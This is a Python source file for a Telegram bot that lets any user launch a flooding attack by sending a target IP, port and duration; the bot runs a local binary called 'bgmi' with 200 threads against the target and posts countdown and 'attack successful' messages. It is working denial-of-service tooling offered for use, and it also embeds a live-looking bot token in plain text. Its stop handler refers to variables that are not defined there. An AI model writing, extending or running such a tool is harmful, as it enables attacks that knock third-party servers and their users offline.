import subprocess
import json
import os
import random
import string
import datetime
import time
import telebot
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from keep_alive import keep_alive
keep_alive()

bot = telebot.TeleBot('7241214892:AAHA1-e8PcnlriU5kSx2Ohz4bjXz6cCoNpo')
DEFAULT_THREADS = 200
active_processes = {}

def countdown_timer(chat_id, message_id, target_ip, port, total_time):
    remaining_time = int(total_time)
    while remaining_time > 0:
        bot.edit_message_text(
            f"𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗗 𝗢𝗡𝗚𝗢𝗜𝗡𝗚\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘: {remaining_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕",
            chat_id,
            message_id
        )
        time.sleep(1)
        remaining_time -= 1

    flooding_process = active_processes.pop(chat_id, None)
    if flooding_process is not None:
        flooding_process.terminate()
        bot.edit_message_text(
            f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕",
            chat_id,
            message_id
        )

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    cmd = message.text.split()
    if len(cmd) != 3:
        bot.reply_to(message, 'Usage: <target_ip> <port> <time>')
        return
    target_ip, port, total_time = cmd[0], cmd[1], cmd[2]
    if '.' not in target_ip or not port.isdigit() or not total_time.isdigit():
        bot.reply_to(message, '<target_ip> <port> <time>')
        return
    flooding_command = ['./bgmi', target_ip, port, total_time, str(DEFAULT_THREADS)]
    flooding_process = subprocess.Popen(flooding_command)
    active_processes[message.chat.id] = flooding_process
    buttons = [[InlineKeyboardButton("𝗦𝗧𝗢𝗣🚫", callback_data='stop')]]
    reply_markup = InlineKeyboardMarkup(buttons)
    reply_message = bot.reply_to(message, f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗢𝗡\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕", reply_markup=reply_markup)
    timer_thread = threading.Thread(target=countdown_timer, args=(message.chat.id, reply_message.message_id, target_ip, port, total_time))
    timer_thread.start()

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call: CallbackQuery):
    if call.data == 'stop':
        flooding_process = active_processes.pop(call.message.chat.id, None)
        if flooding_process is not None:
            flooding_process.terminate()
            bot.edit_message_text(
                f"𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗢𝗡\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}",
                call.message.chat.id,
                call.message.message_id
            )
        else:
            bot.answer_callback_query(call.id, "No active process found.")
print("Bot Started")
bot.polling()
